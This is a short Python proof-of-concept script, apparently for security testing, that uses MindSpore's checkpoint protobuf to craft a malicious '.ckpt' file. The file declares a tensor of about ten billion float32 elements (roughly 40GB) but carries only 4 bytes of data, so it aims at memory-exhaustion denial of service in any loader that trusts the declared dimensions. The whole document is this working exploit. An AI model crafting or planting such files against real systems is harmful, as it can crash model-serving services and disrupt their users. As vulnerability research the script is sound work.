import sys
sys.path.insert(0, '')
from mindspore.train.checkpoint_pb2 import Checkpoint
msg = Checkpoint()
v = msg.value.add()
v.tag = 'x'
v.tensor.tensor_type = 'Float32'
v.tensor.dims.extend([100000, 100000, 1])   # 1e10 elems * 4B = 40GB
v.tensor.tensor_content = b'\x00\x00\x80\x3f'  # just 4 bytes
open('dos_moderate_own.ckpt','wb').write(msg.SerializeToString())
print('wrote dos_moderate_own.ckpt, size =', len(msg.SerializeToString()), 'bytes')
